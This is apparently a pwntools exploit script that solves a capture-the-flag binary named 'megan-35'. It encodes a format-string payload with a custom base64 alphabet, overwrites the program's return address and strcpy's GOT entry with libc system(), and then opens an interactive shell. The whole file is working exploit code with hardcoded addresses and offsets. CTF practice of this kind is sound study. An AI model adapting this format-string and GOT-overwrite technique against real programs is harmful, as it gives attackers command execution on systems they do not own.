from pwn import *
import subprocess, sys, os, base64

megan35 = "3GHIJKLMNOPQRSTUb=cdefghijklmnopWXYZ/12+406789VaqrstuvwxyzABCDEF5"

class B64weird_encodings:
 
    def __init__(self, translation):
        b = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/="
        self.srch = dict(zip(b, translation))
        self.revlsrch = dict(zip(translation, b))
 
    def encode(self, pt):
        global srch
        b64 = base64.b64encode(pt)
        r = "".join([self.srch[x] for x in b64])
        return r
 
    def decode(self, code):
        global revlsrch
        b64 = "".join([self.revlsrch[x] for x in code])
        r = base64.b64decode(b64)
        return r    
 
def encode(variant, pt):
    encoder = B64weird_encodings(variant)
    return encoder.encode(pt)
 
def decode(variant, code):
    try:
        encoder = B64weird_encodings(variant)
        return encoder.decode(code)
    except KeyError:
        return "Not valid"
    except TypeError:
        return "Padding iccorrect"
 

# arg1 offset : 71
# main ret offset : 147
# (libc base + 0x1b2000) offset : 145
# main ret : 0xffffd67c
# libc base : 0xf7fc9000 - 0x1b2000

e = ELF("./libc.so.6")
libcbase = 0xf7e20000
system = libcbase + e.symbols['system']
strcpy_got = 0x0804A00C
main_ret = 0xffffd66c
main = 0x80484e0

payload = fmtstr_payload(71,{main_ret:main,strcpy_got:system},write_size='byte')+"bbbb"
payload = encode(megan35,payload)
print payload
p = process("./megan-35")
raw_input()
p.recv()
p.sendline(payload)
print p.recv()

payload = raw_input("> ")[:-1]
payload = encode(megan35,payload)
p.sendline(payload)
p.interactive()
